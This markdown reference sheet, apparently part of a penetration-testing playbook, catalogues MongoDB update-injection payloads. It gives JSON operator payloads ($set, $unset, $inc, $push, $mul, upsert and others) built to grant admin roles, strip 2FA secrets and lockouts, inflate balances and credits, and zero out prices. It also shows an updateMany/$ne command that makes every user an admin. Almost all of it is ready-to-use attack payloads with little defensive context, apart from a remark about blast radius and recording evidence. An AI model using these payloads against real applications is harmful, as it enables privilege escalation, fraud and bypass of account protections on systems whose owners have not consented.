# Update injection — the write-side operators

## The shape — the update-filter is injectable

```javascript
db.users.updateOne({user: req.body.user}, {$set: {x: 1}})
db.users.updateMany({user: req.body.user}, {$set: {x: 1}})
db.users.findOneAndUpdate({user: req.body.user}, ...)
db.users.replaceOne({user: req.body.user}, ...)
```

The update's FILTER is injectable — `$ne` matches all → mass-update —
`blast-radius` — dangerous.

## The `$set` — the field-update

```json
{"$set": {"role": "admin"}}
{"$set": {"isAdmin": true}}
{"$set": {"verified": true}}
{"$set": {"balance": 1000000}}
{"$set": {"tier": "premium"}}
{"$set": {"credits": 999}}
{"$set": {"flag_access": true}}
{"$set": {"role": {"$literal": "admin"}}}
```

`$set` — set a field — the role/flag-access injection.

## The `$unset` — the field-removal

```json
{"$unset": {"isLocked": ""}}
{"$unset": {"banned": ""}}
{"$unset": {"2fa_secret": ""}}
{"$unset": {"rate_limit": ""}}
{"$unset": {"lockout_until": ""}}
```

`$unset` — remove a field — the lockout/2fa removal.

## The `$inc` — the counter-increment

```json
{"$inc": {"balance": 1000000}}
{"$inc": {"credits": 999}}
{"$inc": {"login_attempts": -100}}
{"$inc": {"points": 9999}}
```

`$inc` — increment — the balance/credits/login-attempt manipulation.

## The `$rename` — the field-rename

```json
{"$rename": {"user": "admin_name"}}
{"$rename": {"temp": "role"}}
```

`$rename` — rename a field — the field-swap — `operators.md`.

## The `$push`/`$addToSet` — the array-update

```json
{"$push": {"roles": "admin"}}
{"$addToSet": {"permissions": "admin"}}
{"$push": {"groups": {"$each": ["admin", "root"]}}}
```

`$push`/`$addToSet` — add to an array — the roles/permissions array.

## The `$pull`/`$pop` — the array-removal

```json
{"$pull": {"roles": "user"}}
{"$pop": {"roles": 1}}
{"$pull": {"restrictions": "read_only"}}
```

`$pull`/`$pop` — remove from an array — the restriction-removal.

## The `$min`/`$max` — the conditional-update

```json
{"$max": {"score": 9999}}
{"$min": {"age": 18}}
```

`$max`/`$min` — set-if-greater/smaller — the score/age injection.

## The `$currentDate` — the timestamp

```json
{"$currentDate": {"verified_at": true}}
{"$currentDate": {"last_login": {"$type": "timestamp"}}}
```

`$currentDate` — set to now — the verification-timestamp.

## The `$mul` — the multiply

```json
{"$mul": {"price": 0}}
{"$mul": {"balance": 100}}
```

`$mul` — multiply — the price/balance manipulation.

## The `upsert` — insert-if-missing

```javascript
db.users.updateOne({user: "new_admin"}, {$set: {role: "admin"}}, {upsert: true})
```

`upsert: true` — creates the doc if missing — the insert-injection.

## The mass-update danger — `updateMany` + `$ne`

```javascript
db.users.updateMany({user: {$ne: null}}, {$set: {role: "admin"}})
```

`updateMany` + `$ne` — EVERY user becomes admin — `blast-radius` —
record the count first — `evidence-rules.md`.

## The `findOneAndUpdate` — the read+write

```javascript
db.users.findOneAndUpdate({user: {$ne: null}}, {$set: {role: "admin"}}, {returnDocument: "after"})
```

`findOneAndUpdate` — returns the doc — the update's readback —
`detection.md`.
